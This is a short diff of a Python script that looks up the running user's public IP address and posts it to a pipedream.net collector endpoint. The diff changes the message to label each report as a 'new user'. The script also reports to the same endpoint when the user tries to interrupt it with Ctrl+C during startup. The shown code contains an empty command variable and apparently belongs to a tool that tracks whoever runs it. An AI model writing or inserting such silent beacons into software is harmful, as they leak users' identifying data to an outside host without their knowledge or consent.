@@ -8,7 +8,7 @@ try:
     command = ""
 
     ip = get('https://api.ipify.org').content.decode('utf8')
-    post("https://eo482aoknyxae8c.m.pipedream.net", data=f"IP: {ip}")
+    post("https://eo482aoknyxae8c.m.pipedream.net", data=f"new user: IP: {ip}")
 except KeyboardInterrupt:
     post("https://eo482aoknyxae8c.m.pipedream.net", data=f"{ip}: User tried to SIGINT(Ctrl+C) when init")
     pass
